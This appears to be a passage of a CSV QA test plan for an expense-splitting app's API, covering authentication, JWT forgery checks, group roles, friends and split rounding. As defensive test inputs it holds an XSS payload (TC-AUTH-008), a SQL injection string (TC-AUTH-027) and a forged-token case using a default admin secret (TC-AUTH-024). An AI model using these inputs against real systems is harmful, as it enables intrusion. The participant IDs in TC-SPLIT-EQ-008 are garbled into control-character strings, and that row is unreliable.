ID,Category,Test Type,Priority,Preconditions,Steps,Input Data,Expected Result,Related Doc Section,Notes/Risk Flag
TC-AUTH-001,Auth - Phone OTP,Happy Path,Critical,User with phone +919812345678 not yet registered; OTP_PROVIDER_DRIVER=dev,"1. POST /v1/auth/request-otp with phoneNumber=+919812345678
2. Read OtpChallengeEntity created for target
3. POST /v1/auth/verify-otp with code=123456 (OTP_DEV_CODE)","phoneNumber=+919812345678, code=123456","201/200: OtpChallengeEntity created with expiresAt in future; verify-otp returns 200 with new UserEntity created, AuthIdentityEntity(provider=phone_otp) created, JWT access+refresh token pair returned.",Section 5 - Auth Endpoints; Section 6 - SMS OTP,
TC-AUTH-002,Auth - Phone OTP,Boundary,Critical,"Fresh OtpChallengeEntity exists for phone, attemptsCount=0","1. POST /v1/auth/verify-otp with wrong code 000000 five times in a row
2. POST /v1/auth/verify-otp a 6th time with correct code 123456","5x wrong code=000000, then code=123456","UNVERIFIED — doc does not specify max attemptsCount lockout threshold; confirm rate-limit/lockout policy with dev before running. Expected: after threshold, further attempts (even correct code) should be rejected with 429 or 400 'too many attempts'.",Section 4.1 OtpChallengeEntity.attemptsCount,Known gap: attemptsCount field exists but lockout threshold undocumented
TC-AUTH-003,Auth - Phone OTP,Negative,Critical,No OtpChallengeEntity exists for phone +919999999999,"1. POST /v1/auth/verify-otp with phoneNumber=+919999999999, code=123456","phoneNumber=+919999999999, code=123456",400 Bad Request: 'No OTP challenge found' or equivalent — must not create a session.,Section 5 - /v1/auth/verify-otp,
TC-AUTH-004,Auth - Phone OTP,Boundary,High,OtpChallengeEntity exists with expiresAt = now - 1 second (just expired),"1. Wait until OTP expiresAt has passed by 1 second
2. POST /v1/auth/verify-otp with the correct code","code=123456, expiresAt already passed",400 Bad Request: 'OTP expired' — token pair NOT issued.,Section 4.1 OtpChallengeEntity.expiresAt,
TC-AUTH-005,Auth - Phone OTP,Negative,High,"OTP_PROVIDER_DRIVER=twilio_verify, ALLOW_INSECURE_DEV_PROVIDERS=false, NODE_ENV=production",1. POST /v1/auth/verify-otp with code=123456 (the dev bypass code) in production mode,"code=123456, NODE_ENV=production",400/401: dev bypass code must be rejected in production when ALLOW_INSECURE_DEV_PROVIDERS=false; only Twilio-issued codes accepted.,"Section 1 env vars: ALLOW_INSECURE_DEV_PROVIDERS, OTP_DEV_CODE",Security-critical: dev bypass code must never work in prod
TC-AUTH-006,Auth - Email OTP,Happy Path,Critical,EMAIL_PROVIDER_DRIVER=dev; email not yet registered,"1. POST /v1/auth/request-otp with email=test.user@example.com
2. POST /v1/auth/verify-otp with code=123456","email=test.user@example.com, code=123456","OtpChallengeEntity(target=email) created; verify-otp returns 200 with new UserEntity, AuthIdentityEntity(provider=email_otp), JWT tokens.",Section 5 - Auth Endpoints,
TC-AUTH-007,Auth - Email OTP,Negative,Medium,None,1. POST /v1/auth/request-otp with email='not-an-email',email=not-an-email,"400 Bad Request: DTO validation failure, 'email must be a valid email address'.",Section 8 - DTO Input Validation,
TC-AUTH-008,Auth - Email OTP,Negative,Medium,None,1. POST /v1/auth/request-otp with email='<script>alert(1)</script>@example.com',email=<script>alert(1)</script>@example.com,400 Bad Request: DTO validation rejects malformed email; no script is persisted or reflected unescaped in any response.,Section 8 - DTO Input Validation,Injection/XSS defense check
TC-AUTH-009,Auth - Google OAuth,Happy Path,Critical,Valid Google ID token for a Google account not yet linked to any UserEntity; GOOGLE_OAUTH_CLIENT_ID configured,"1. Obtain valid Google ID token via test Google account
2. POST /v1/auth/google with idToken",idToken=<valid Google ID token>,"200: google-auth-library verifies token, creates UserEntity + AuthIdentityEntity(provider=google, identifier=googleSub), returns JWT access+refresh pair.",Section 2 Feature Inventory - Google OAuth 2.0; Section 6 Integrations,
TC-AUTH-010,Auth - Google OAuth,Happy Path,High,Google account already linked to existing UserEntity via prior sign-in,1. POST /v1/auth/google with idToken for the same Google account again,"idToken=<same account, second login>","200: existing UserEntity is reused (no duplicate user created), AuthIdentityEntity.lastLoginAt updated, new JWT pair issued.",Section 4.1 AuthIdentityEntity.lastLoginAt,
TC-AUTH-011,Auth - Google OAuth,Negative,Critical,None,1. POST /v1/auth/google with idToken='invalid.jwt.token',idToken=invalid.jwt.token,"401 Unauthorized: google-auth-library verification fails; no user created, no tokens issued.",Section 5 /v1/auth/google,
TC-AUTH-012,Auth - Google OAuth,Negative,Critical,Valid ID token but issued for a different OAuth Client ID than GOOGLE_OAUTH_CLIENT_ID,1. POST /v1/auth/google with idToken signed for a mismatched audience/client ID,idToken=<token with wrong 'aud' claim>,401 Unauthorized: audience mismatch rejected by google-auth-library verification.,Section 1 env vars GOOGLE_OAUTH_CLIENT_ID,
TC-AUTH-013,Auth - Token Refresh,Happy Path,Critical,"User logged in with valid, non-revoked RefreshSessionEntity",1. POST /v1/auth/refresh with valid refresh token,refreshToken=<valid>,200: old RefreshSessionEntity is invalidated (revokedAt set) and a new RefreshSessionEntity + new Access/Refresh JWT pair is returned (rotation).,Section 5 /v1/auth/refresh,
TC-AUTH-014,Auth - Token Refresh,Negative,Critical,RefreshSessionEntity already revoked (e.g. used once already),"1. POST /v1/auth/refresh once (success, token rotated)
2. POST /v1/auth/refresh again reusing the SAME original refresh token","Reused, already-rotated refresh token",401 Unauthorized: reuse of a revoked/rotated refresh token must be rejected. UNVERIFIED — doc does not state whether reuse triggers revocation of the entire session family (refresh token theft detection); confirm with dev.,Section 4.1 RefreshSessionEntity.revokedAt,Security-critical token rotation/reuse-detection gap
TC-AUTH-015,Auth - Token Refresh,Boundary,High,Access token exactly at 15-minute expiry boundary,"1. Issue access token at T0
2. Call any authenticated endpoint at T0+15:00 (exactly)
3. Call same endpoint at T0+15:01",Access token age = 15:00 and 15:01,At 15:00 (not yet expired if exp is exclusive) request should succeed; at 15:01 request must return 401 'token expired'. UNVERIFIED — exact boundary inclusivity not documented; confirm with dev.,Section 7 Authentication Architecture - 15 minute access token,
TC-AUTH-016,Auth - Token Refresh,Negative,High,RefreshSessionEntity expiresAt already passed (>7 days old),1. POST /v1/auth/refresh with a refresh token older than 7 days,refreshToken=<8-day-old token>,"401 Unauthorized: expired refresh session, user must re-authenticate via OTP/Google.",Section 7 - Refresh Token: 7 days,
TC-AUTH-017,Auth - Logout,Happy Path,High,User authenticated with valid access token and active RefreshSessionEntity,1. POST /v1/auth/logout with valid access JWT,Authorization: Bearer <valid access token>,200: RefreshSessionEntity.revokedAt set to current time; subsequent POST /v1/auth/refresh with that session's refresh token returns 401.,Section 5 /v1/auth/logout,
TC-AUTH-018,Auth - Logout,Negative,Medium,None,1. POST /v1/auth/logout with no Authorization header,No token,401 Unauthorized.,Section 5 /v1/auth/logout,
TC-AUTH-019,Auth - No Token,Negative,Critical,None,1. GET /v1/groups with no Authorization header,No token,"401 Unauthorized, no group data leaked in response body.",Section 7 Authentication Architecture,
TC-AUTH-020,Auth - Expired Token,Negative,Critical,Access token past 15-minute expiry,1. GET /v1/groups with expired access JWT,Authorization: Bearer <expired token>,"401 Unauthorized with a token-expired error code distinct from generic invalid-token, if documented; at minimum 401.",Section 7 Authentication Architecture,
TC-AUTH-021,Auth - Malformed Token,Negative,Critical,None,1. GET /v1/groups with Authorization: Bearer not-a-real-jwt,Malformed JWT string,"401 Unauthorized, request rejected before any DB query for group data.",Section 7 Authentication Architecture,
TC-AUTH-022,Auth - Wrong Secret Token,Negative,Critical,"Attacker forges JWT with arbitrary secret, valid-looking payload (sub=victim userId)","1. Craft JWT signed with a guessed/incorrect secret
2. GET /v1/groups with forged token",Forged JWT with victim's userId in 'sub' claim,401 Unauthorized: signature verification against JWT_ACCESS_SECRET fails.,Section 1 env vars JWT_ACCESS_SECRET,Security-critical
TC-AUTH-023,Auth - Admin JWT Isolation,Negative,Critical,Valid regular-user access token (signed with JWT_ACCESS_SECRET) exists,1. GET /v1/admin/users using the regular user's access token (not an admin token),Authorization: Bearer <regular user JWT>,"401/403: admin routes verify against JWT_ADMIN_ACCESS_SECRET, a distinct secret, so a regular user token must be rejected outright.",Section 7 - Admin JWT dedicated secrets,
TC-AUTH-024,Auth - Admin JWT Default Secret,Negative,Critical,Deployment running with default env value for JWT_ADMIN_ACCESS_SECRET (i.e. operator did not override the 'super-admin-secret...' default),"1. Craft an admin JWT signed with the known default secret string documented as the default value
2. GET /v1/admin/users with the forged admin token",Admin JWT signed with default fallback secret,"If the deployment did not override JWT_ADMIN_ACCESS_SECRET, this forged token WILL authenticate — flag as critical misconfiguration risk. Test verifies the deployed environment does NOT use the documented default value.",Section 1 env vars - JWT_ADMIN_ACCESS_SECRET default = 'super-admin-secret...',Known gap: insecure default secret shipped in config; must be overridden in every real deployment
TC-AUTH-025,Auth - Idempotent Register,Boundary,Medium,Phone +919812345678 already has a UserEntity from a prior OTP verification,1. Repeat full OTP request+verify flow for the same phone number a second time,phoneNumber=+919812345678 (2nd time),"200: existing UserEntity reused, no duplicate UserEntity/AuthIdentityEntity row created, new JWT pair issued.",Section 5 /v1/auth/verify-otp,
TC-AUTH-026,Auth - Concurrent OTP Verify,Concurrency,High,"Single valid OtpChallengeEntity, not yet verified",1. Fire two simultaneous POST /v1/auth/verify-otp requests with the same correct code from two different clients,"Two parallel requests, same code=123456","UNVERIFIED — doc does not specify idempotency/locking behavior for concurrent OTP verification. Expected (best-guess): both may succeed and each returns a valid but distinct RefreshSessionEntity, OR the second is rejected as already-verified; confirm with dev.",Section 4.1 OtpChallengeEntity.verifiedAt,
TC-AUTH-027,Auth - SQLi in phone field,Negative,Critical,None,"1. POST /v1/auth/request-otp with phoneNumber=""'; DROP TABLE users;--""",phoneNumber=' ; DROP TABLE users;--,400 Bad Request via DTO validation (invalid phone format); TypeORM parameterized queries prevent any SQL execution regardless. users table must remain intact.,Section 8 DTO Input Validation,Injection defense check
TC-AUTH-028,Auth - Unicode display name,Boundary,Low,Authenticated user completing profile,1. PATCH /v1/users/me with displayName='नीरज 🚀 名前',displayName=नीरज 🚀 名前,200: unicode/emoji displayName stored and returned unchanged (UTF-8 safe) in UserEntity.displayName.,Section 4.1 UserEntity.displayName; Section 2 User Profile & Contacts,
TC-AUTH-029,Auth - Extremely long display name,Boundary,Medium,Authenticated user,1. PATCH /v1/users/me with displayName = 5000-character string,displayName = 'A'*5000,400 Bad Request: DTO validation should enforce a max length (exact limit undocumented). UNVERIFIED — max displayName length not specified in doc; confirm limit with dev.,Section 8 DTO Input Validation,Undocumented max length constraint
TC-AUTH-030,Auth - Device Registration,Happy Path,Medium,Authenticated user on Android device,"1. POST device token registration with deviceToken=<expo push token>, platform=android, pushProvider=expo","deviceToken, platform=android, pushProvider=expo",200: DeviceInstallationEntity created/updated with lastSeenAt=now.,Section 4.1 DeviceInstallationEntity,
TC-AUTH-031,Auth - Device Registration invalid platform,Negative,Low,Authenticated user,1. POST device token registration with platform='windows_phone' (not in enum ios|android|web),platform=windows_phone,400 Bad Request: DTO enum validation rejects unsupported platform value.,Section 4.1 DeviceInstallationEntity.platform enum,
TC-AUTH-032,Auth - Suspended user login,State-Sequence,High,UserEntity.status='suspended' (set by admin),1. Suspended user attempts POST /v1/auth/verify-otp with correct code,Suspended account credentials,UNVERIFIED — doc does not specify whether a suspended user can still obtain tokens or whether tokens are rejected downstream by a guard. Expected (best-guess): 403 Forbidden 'account suspended'; confirm with dev.,Section 4.1 UserEntity.status enum,Known gap: suspension enforcement point not documented
TC-GROUP-001,Group Lifecycle,Happy Path,Critical,Authenticated user A with valid access token,"1. POST /v1/groups with name='Goa Trip 2026', defaultCurrencyCode='INR'","name=Goa Trip 2026, defaultCurrencyCode=INR",201: GroupEntity created with unique inviteCode; GroupMembershipEntity created for A with role='owner'; A can immediately GET /v1/groups/:id.,Section 5 POST /v1/groups,
TC-GROUP-002,Group Lifecycle,Negative,High,Authenticated user,1. POST /v1/groups with name='' (empty string),name='',400 Bad Request: DTO validation requires non-empty name.,Section 8 DTO Input Validation,
TC-GROUP-003,Group Lifecycle,Boundary,Medium,Authenticated user,1. POST /v1/groups with name = 300-character string,name = 'X'*300,"UNVERIFIED — max group name length not documented; expect 400 if a limit exists, confirm with dev.",Section 8 DTO Input Validation,
TC-GROUP-004,Group Lifecycle,Negative,Medium,Authenticated user,1. POST /v1/groups with defaultCurrencyCode='RUPEE' (not ISO-3),defaultCurrencyCode=RUPEE,400 Bad Request: DTO validation enforces 3-letter ISO currency code per Money class rule (/^[A-Z]{3}$/).,Section 3.1 Money.currencyCode validation,
TC-GROUP-005,Group Lifecycle,Happy Path,Medium,"Group exists, user A is owner",1. GET /v1/groups/:id as owner A,groupId,"200: returns group metadata (name, category, defaultCurrencyCode, simplifyDebtsEnabled, inviteCode), member list, and net balance summary per member.",Section 5 GET /v1/groups/:id,
TC-GROUP-006,Group Lifecycle,Permission,Critical,Group exists; user X is not a member,1. GET /v1/groups/:id as non-member X,"groupId, non-member token",403 Forbidden (or 404 to avoid leaking existence — UNVERIFIED which one; confirm with dev). Response must NOT include group financial data.,Section 7 Authorization Matrix,
TC-GROUP-007,Group Lifecycle,State-Sequence,High,Group archived (archivedAt set) by owner,"1. Owner archives group
2. Member attempts POST new expense to the archived group",Archived groupId,UNVERIFIED — doc does not specify whether archived groups reject new expense creation; expected (best-guess) 409 Conflict 'group archived'; confirm with dev.,Section 4.2 GroupEntity.archivedAt,Known gap: archived-group write behavior undocumented
TC-GROUP-008,Group Roles,Happy Path,High,Group with owner A and member B,1. Owner A calls role-change endpoint setting B's role to 'admin',"targetUserId=B, newRole=admin","200: GroupMembershipEntity.role for B updated to 'admin'; B can now perform admin-only actions (export, member_invite, expense_void).",Section 7 Authorization Matrix - member_role_change (Owner only),
TC-GROUP-009,Group Roles,Permission,Critical,"Group with owner A, admin B, member C",1. Admin B attempts to change C's role to 'admin',"Actor=admin B, targetUserId=C, newRole=admin",403 Forbidden: member_role_change permission is Owner-only per Authorization Matrix; admins cannot change roles.,Section 7 Authorization Matrix - member_role_change ✅Owner ❌Admin,
TC-GROUP-010,Group Roles,Permission,High,Group with owner A and one other member B,1. Owner A attempts to remove/demote themselves as the sole owner,"Actor=owner A, target=self",UNVERIFIED — doc does not state whether a group can be left with zero owners; expected (best-guess) 409 Conflict 'group must have an owner'; confirm with dev.,Section 4.2 GroupMembershipEntity.role,Known gap: last-owner-removal protection undocumented
TC-GROUP-011,Group Invite Links,Happy Path,Critical,Group exists with valid inviteCode,1. New user D calls POST /v1/join/:inviteCode with valid code,inviteCode=<valid 8-char code>,200/201: GroupMembershipEntity created for D with role='member'; D appears in group member list.,Section 5 POST /v1/join/:inviteCode,
TC-GROUP-012,Group Invite Links,Negative,High,None,1. POST /v1/join/INVALIDCODE123,inviteCode=INVALIDCODE123,404 Not Found: invite code does not match any GroupEntity.inviteCode.,Section 5 POST /v1/join/:inviteCode,
TC-GROUP-013,Group Invite Links,State-Sequence,Medium,User D already a member of group G,1. D calls POST /v1/join/:inviteCode for group G again using the same valid code,"inviteCode=<G's code>, actor already a member",UNVERIFIED — doc doesn't specify idempotency here; expected (best-guess) 200 no-op or 409 'already a member'; confirm with dev.,Section 5 POST /v1/join/:inviteCode,
TC-GROUP-014,Group Invite Links,Negative,Medium,Group archived,1. New user attempts POST /v1/join/:inviteCode for an archived group's code,inviteCode=<archived group's code>,UNVERIFIED — doc doesn't state whether archived groups accept new joiners; expected 409/404; confirm with dev.,Section 4.2 GroupEntity.archivedAt,
TC-GROUP-015,Group Members,Happy Path,High,Group with owner A; B not yet a member,1. Owner A calls POST /v1/groups/:id/members with email of B (registered user),email=b@example.com,"201: ParticipantEntity + GroupMembershipEntity(role=member) created for B, linked to existing UserEntity via email match.",Section 5 POST /v1/groups/:id/members,
TC-GROUP-016,Group Members,Happy Path,High,Group with owner A; guest 'Priya' has no account,"1. Owner A calls POST /v1/groups/:id/members with displayName='Priya', phoneNumber='+919000000001', no userId","displayName=Priya, phoneNumber=+919000000001","201: 'Ghost' ParticipantEntity created with userId=null, displayName='Priya'; ghost can be assigned expense shares before signing up.",Section 4.2 ParticipantEntity.userId nullable; Section 10 Gap #3 Ghost User Claiming,
TC-GROUP-017,Group Members,Permission,Critical,"Group with owner A, member B, viewer C",1. Viewer C attempts POST /v1/groups/:id/members to add a new member,Actor=viewer C,403 Forbidden: member_invite permission requires Owner or Admin per Authorization Matrix; Member and Viewer are denied.,Section 7 Authorization Matrix - member_invite ✅Owner ✅Admin ❌Member ❌Viewer,
TC-GROUP-018,Group Members - Ghost Claim,State-Sequence,High,Ghost ParticipantEntity 'Priya' (userId=null) exists in Group G with phoneNumber +919000000001; several expenses already reference this participant,"1. Real user registers via OTP using phone +919000000001
2. System runs ContactAliasEntity matching during signup",phoneNumber=+919000000001 used both for ghost creation and later signup,ParticipantEntity.userId is backfilled to the newly created UserEntity.id; all historical ExpenseShareEntity/ExpensePayerEntity/LedgerPostingEntity rows referencing that participantId now resolve to the real user with balances unchanged (sum still zero across postings).,Section 10 Gap #3 - Ghost/Guest User Claiming,Known gap: doc flags this as needing verification that balance projections stay clean after claim
TC-GROUP-019,Group Members - Ghost Claim,Boundary,High,Ghost participant has a PARTIAL settlement already confirmed against them before claiming their account,"1. Ghost participant receives partial settlement (confirmed) while still a ghost
2. Ghost's phone number is later claimed by a real signup",Partial SettlementIntentEntity state=confirmed pre-claim,UNVERIFIED — doc explicitly flags this exact scenario as unresolved ('partial settlements made prior to user claim must update balance projections cleanly'); confirm expected post-claim balance with dev before running.,Section 10 Gap #3,"HIGH-VALUE known-gap case, directly quoted from source doc"
TC-GROUP-020,Group Members,Negative,Medium,Group with owner A,1. Owner A attempts to add a member using a phoneNumber that is already a ghost participant's phone in the SAME group,Duplicate phoneNumber within same group,UNVERIFIED — doc doesn't specify duplicate-participant handling within one group; expected 409 Conflict or merge; confirm with dev.,Section 4.2 ParticipantEntity,
TC-GROUP-021,Group Members,Happy Path,Medium,"Group with 2 members: owner A, member B",1. Owner A removes member B via member removal endpoint,targetUserId=B,200: GroupMembershipEntity for B is removed/deactivated; B can no longer GET the group; B's historical expense shares remain in the ledger (immutable event store).,Section 2 Group Lifecycle & Roles,
TC-GROUP-022,Group Members,State-Sequence,Critical,"Group with owner A, member B; B has a non-zero outstanding balance (owes ₹500)",1. Owner A attempts to remove member B while B has a non-zero balance,B netBalanceMinor = -50000 (owes ₹500),UNVERIFIED — doc doesn't specify whether removal is blocked when balance≠0; expected (best-guess) 409 Conflict 'member has outstanding balance'; confirm with dev.,Section 4.4 GroupBalanceProjectionEntity.netBalanceMinor,Known gap: no documented guard against removing a member with a live balance
TC-GROUP-023,Group Categories,Boundary,Low,Authenticated user,1. POST /v1/groups with category=null (omitted),category omitted,201: group created successfully; category stored as null/default since field is not marked required in schema.,Section 4.2 GroupEntity.category,
TC-GROUP-024,Group - SimplifyDebts flag,Happy Path,Medium,Group exists with simplifyDebtsEnabled=true,"1. Toggle simplifyDebtsEnabled to false via group settings update
2. GET /v1/groups/:id/settlements/suggestions",simplifyDebtsEnabled=false,"UNVERIFIED — doc doesn't specify whether suggestions endpoint still runs GreedySettlementOptimizer when the flag is false, or returns raw pairwise debts instead; confirm with dev.",Section 4.2 GroupEntity.simplifyDebtsEnabled,Known gap: flag's exact effect on suggestions endpoint undocumented
TC-GROUP-025,Group - Large Membership,Boundary,Medium,Group creation flow available,"1. Create a group and add 50 members (owner + 49 others)
2. GET /v1/groups/:id",50 total members,200: all 50 members returned; response performance acceptable; no truncation of member list.,Section 4.2 GroupMembershipEntity,
TC-GROUP-026,Group - Two-member minimum,Boundary,Low,Authenticated user creates a group,"1. Create group with only the owner (no other members added)
2. Add a single ₹100 expense split equally between owner and... only 1 participant exists","1-participant group, single-payer expense","Equal split among 1 participant allocates full totalMinor (10000 paise) to that single participant; net balance = 0 (self-owed, self-paid).",Section 3.2 RoundingAllocator with N=1,
TC-FRIEND-001,Friends,Happy Path,High,Authenticated user A; user B registered with phone +919876500000,1. A calls POST /v1/friends with phoneNumber=+919876500000,phoneNumber=+919876500000,201: direct pairwise ledger participants created for A and B without a GroupEntity container; friendship visible in both A's and B's friend list.,Section 2 Friends & 1-on-1 Ledgers,
TC-FRIEND-002,Friends,Happy Path,Medium,A and B are friends with a direct ledger; A pays ₹500 expense split equally,"1. A logs expense: description='Lunch', totalAmountMinor=50000, payer=A, split=equal between A,B",totalAmountMinor=50000,"Ledger posting: A signedAmountMinor=+25000, B signedAmountMinor=-25000 (B owes A ₹250.00); sum=0.",Section 3.5 Balanced Posting Set,
TC-FRIEND-003,Friends,Negative,Medium,A already friends with B,1. A calls POST /v1/friends with B's phone number again,Duplicate friend add,UNVERIFIED — doc doesn't specify duplicate-friend handling; expected 200 no-op or 409; confirm with dev.,Section 2 Friends & 1-on-1 Ledgers,
TC-FRIEND-004,Friends,Negative,Medium,None,1. A calls POST /v1/friends with phoneNumber of a non-registered user,phoneNumber=+919000000099 (unregistered),UNVERIFIED — doc doesn't state whether this creates a ghost participant (like group members do) or returns 404; expected: ghost participant created for consistency with group behavior; confirm with dev.,Section 2 Friends & 1-on-1 Ledgers; Section 4.2 ParticipantEntity.userId nullable,
TC-FRIEND-005,Friends,Permission,High,A and B are NOT friends and share no group,1. A attempts to GET the pairwise balance/ledger with B,"Actor=A, target=B (no relationship)",404/403: no direct ledger exists between A and B; no financial data returned.,Section 2 Friends & 1-on-1 Ledgers,
TC-FRIEND-006,Friends,Rounding,High,A and B are friends; A logs ₹0.01 (1 paisa) expense split equally,"1. A logs expense totalAmountMinor=1, split=equal between A,B",totalAmountMinor=1,"RoundingAllocator: exact=0.5 each, floor=0 each, remainder=1; sorted by frac (tie 0.5=0.5) then stableHash(participantId) ascending; the participant with the lower stableHash receives the 1 paisa, the other receives 0. Sum=1.",Section 3.2 RoundingAllocator Algorithm,
TC-FRIEND-007,Friends,Boundary,Medium,A and B are friends,1. A logs expense totalAmountMinor=0 (free/zero-cost item) split equally,totalAmountMinor=0,"UNVERIFIED — doc doesn't explicitly state whether a ₹0 expense is permitted (Money class allows 0 as a valid integer); if allowed, both shares=0 and ledger posting sums to 0 trivially; confirm zero-amount expenses are permitted by DTO validation with dev.",Section 3.1 Money class; Section 8 DTO Validation,
TC-FRIEND-008,Friends,Boundary,Medium,A and B are friends,1. A logs expense with totalAmountMinor=-5000 (negative amount),totalAmountMinor=-5000,400 Bad Request: negative expense totals must be rejected by DTO validation (positive integers enforced per Section 8).,Section 8 DTO Input Validation - positive integers for minor units,
TC-FRIEND-009,Friends - Remove,Happy Path,Medium,A and B are friends with zero outstanding balance,1. A calls DELETE friend relationship with B,targetUserId=B,200: friendship/direct ledger relationship removed for A's view (or archived); historical expenses remain in event store.,Section 2 Friends & 1-on-1 Ledgers,
TC-FRIEND-010,Friends - Remove blocked,State-Sequence,High,A and B are friends; B owes A ₹300 (non-zero balance),1. A attempts to DELETE friend relationship with B while balance≠0,netBalanceMinor=30000,UNVERIFIED — doc doesn't specify if removal is blocked on non-zero balance; expected 409 Conflict; confirm with dev.,Section 4.4 GroupBalanceProjectionEntity,
TC-FRIEND-011,Friends,Negative,Low,None,1. A calls POST /v1/friends with phoneNumber=A's own phone number (self-friend),phoneNumber=A's own number,400 Bad Request: cannot add self as friend.,Section 2 Friends & 1-on-1 Ledgers,
TC-SPLIT-EQ-001,Equal Split,Rounding,Critical,"Group/friend context with participants usr_a, usr_b, usr_c exists; expense not yet created.","1. Create expense with totalAmountMinor=10000, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=10000 (₹100.00), participants=3 (₹100.00 among 3 (doc's own worked example))","Allocation: usr_b=₹33.34, usr_c=₹33.33, usr_a=₹33.33. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.2 worked example - direct doc replication,
TC-SPLIT-EQ-002,Equal Split,Rounding,Critical,"Group/friend context with participants usr_a, usr_b exists; expense not yet created.","1. Create expense with totalAmountMinor=1, splitType=equal, participants=['usr_a', 'usr_b']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=1 (₹0.01), participants=2 (1 paisa among 2 (minimum non-zero amount))","Allocation: usr_b=₹0.01, usr_a=₹0.00. Sum=₹0.01 (must equal total ₹0.01). Currency=INR.",Section 3.2 Boundary - smallest possible unit,
TC-SPLIT-EQ-003,Equal Split,Happy Path,High,"Group/friend context with participants usr_a, usr_b, usr_c, usr_d, usr_e exists; expense not yet created.","1. Create expense with totalAmountMinor=100000000, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c', 'usr_d', 'usr_e']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=100000000 (₹1000000.00), participants=5 (₹10,00,000.00 among 5 (large amount))","Allocation: usr_b=₹200000.00, usr_c=₹200000.00, usr_a=₹200000.00, usr_d=₹200000.00, usr_e=₹200000.00. Sum=₹1000000.00 (must equal total ₹1000000.00). Currency=INR.",Section 3.2 Boundary - large amount,
TC-SPLIT-EQ-004,Equal Split,Rounding,High,"Group/friend context with participants usr_a, usr_b, usr_c, usr_d, usr_e, usr_f, usr_g exists; expense not yet created.","1. Create expense with totalAmountMinor=9999, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c', 'usr_d', 'usr_e', 'usr_f', 'usr_g']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=9999 (₹99.99), participants=7 (₹99.99 among 7 (does not divide evenly))","Allocation: usr_b=₹14.29, usr_c=₹14.29, usr_a=₹14.29, usr_f=₹14.28, usr_g=₹14.28, usr_d=₹14.28, usr_e=₹14.28. Sum=₹99.99 (must equal total ₹99.99). Currency=INR.",Section 3.2 Rounding,
TC-SPLIT-EQ-005,Equal Split,Happy Path,High,"Group/friend context with participants usr_a, usr_b exists; expense not yet created.","1. Create expense with totalAmountMinor=100, splitType=equal, participants=['usr_a', 'usr_b']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=100 (₹1.00), participants=2 (₹1.00 among 2)","Allocation: usr_b=₹0.50, usr_a=₹0.50. Sum=₹1.00 (must equal total ₹1.00). Currency=INR.",Section 3.2 Rounding,
TC-SPLIT-EQ-006,Equal Split,Rounding,Critical,"Group/friend context with participants usr_a, usr_b, usr_c exists; expense not yet created.","1. Create expense with totalAmountMinor=100, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=100 (₹1.00), participants=3 (₹1.00 among 3 (repeating decimal))","Allocation: usr_b=₹0.34, usr_c=₹0.33, usr_a=₹0.33. Sum=₹1.00 (must equal total ₹1.00). Currency=INR.",Section 3.2 Rounding,
TC-SPLIT-EQ-007,Equal Split,Rounding,Medium,"Group/friend context with participants usr_a, usr_b, usr_c, usr_d, usr_e, usr_f, usr_g, usr_h, usr_i, usr_j exists; expense not yet created.","1. Create expense with totalAmountMinor=33333, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c', 'usr_d', 'usr_e', 'usr_f', 'usr_g', 'usr_h', 'usr_i', 'usr_j']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=33333 (₹333.33), participants=10 (₹333.33 among 10)","Allocation: usr_j=₹33.34, usr_h=₹33.34, usr_i=₹33.34, usr_b=₹33.33, usr_c=₹33.33, usr_a=₹33.33, usr_f=₹33.33, usr_g=₹33.33, usr_d=₹33.33, usr_e=₹33.33. Sum=₹333.33 (must equal total ₹333.33). Currency=INR.",Section 3.2 Rounding + Boundary member count,
TC-SPLIT-EQ-008,Equal Split,Rounding,Medium,"Group/friend context with participants usr_a, usr_b, usr_c, usr_d, usr_e, usr_f, usr_g, usr_h, usr_i, usr_j, usr_k, usr_l, usr_m, usr_n, usr_o, usr_p, usr_q, usr_r, usr_s, usr_t, usr_u, usr_v, usr_w, usr_x, usr_y, usr_z, usr_{, usr_|, usr_}, usr_~, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_, usr_ exists; expense not yet created.","1. Create expense with totalAmountMinor=250075, splitType=equal, participants=['usr_a', 'usr_b', 'usr_c', 'usr_d', 'usr_e', 'usr_f', 'usr_g', 'usr_h', 'usr_i', 'usr_j', 'usr_k', 'usr_l', 'usr_m', 'usr_n', 'usr_o', 'usr_p', 'usr_q', 'usr_r', 'usr_s', 'usr_t', 'usr_u', 'usr_v', 'usr_w', 'usr_x', 'usr_y', 'usr_z', 'usr_{', 'usr_|', 'usr_}', 'usr_~', 'usr_\x7f', 'usr_\x80', 'usr_\x81', 'usr_\x82', 'usr_\x83', 'usr_\x84', 'usr_\x85', 'usr_\x86', 'usr_\x87', 'usr_\x88', 'usr_\x89', 'usr_\x8a', 'usr_\x8b', 'usr_\x8c', 'usr_\x8d', 'usr_\x8e', 'usr_\x8f', 'usr_\x90', 'usr_\x91', 'usr_\x92']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
